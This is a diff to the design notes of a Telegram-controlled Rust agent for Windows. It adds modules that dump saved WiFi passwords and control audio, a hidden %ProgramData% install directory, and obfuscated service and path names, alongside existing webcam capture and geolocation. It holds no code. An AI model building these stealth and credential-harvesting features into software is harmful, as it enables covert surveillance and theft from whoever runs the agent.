@@ -10,6 +10,7 @@ can send commands from any chat (DM, group).
 - **Target:** `x86_64-pc-windows-msvc` (Windows 10/11)
 - **Runtime:** tokio (full features)
 - **Bot framework:** teloxide 0.17 with macros
+- **Logging:** fern + chrono — daily rotating file logs in `{home}/logs/`
 - **Config:** dotenvy (`.env` file) → baked at compile time via `build.rs`
 - **Error handling:** anyhow
 
@@ -120,6 +121,9 @@ src/
 │   ├── location.rs   # IP geolocation
 │   ├── camera.rs     # Webcam capture
 │   ├── wallpaper.rs  # Get desktop wallpaper
+│   ├── wifi.rs       # Saved WiFi profiles + passwords
+│   ├── audio.rs      # mute, unmute, volume (PowerShell)
+│   ├── msgbox.rs     # MessageBox Win32 (blocking)
 │   └── notify.rs     # Login watcher (stub)
 ├── machine/
 │   ├── mod.rs
@@ -127,11 +131,12 @@ src/
 ├── security/
 │   ├── mod.rs
 │   ├── dpapi.rs      # CryptProtectData / CryptUnprotectData
-│   └── obfuscation.rs # obfstr! for service name, registry path
+│   └── obfuscation.rs # obfstr! for service name, registry path, install_home
 ├── service/
 │   ├── mod.rs
 │   ├── config.rs     # Baked env → registry fallback
-│   ├── install.rs    # SCM install/uninstall
+│   ├── install.rs    # SCM install/uninstall + setup_home_dir()
+│   ├── logging.rs    # DailyFile writer + init_logger()
 │   └── windows_svc.rs # define_windows_service! + SCM dispatch
 └── updater/
     ├── mod.rs
@@ -145,3 +150,5 @@ src/
 4. All commands reply to the specific message via `reply_parameters`.
 5. `AgentState` includes `agent_version = env!("CARGO_PKG_VERSION")` and `start_time: Instant`.
 6. No topic/group constraints — super user can command from anywhere.
+7. Install creates hidden home dir in `%ProgramData%`, copies exe, then registers service.
+8. Log files in `{home}/logs/agent_YYYY-MM-DD.log`, daily rotation via `DailyFile` writer.
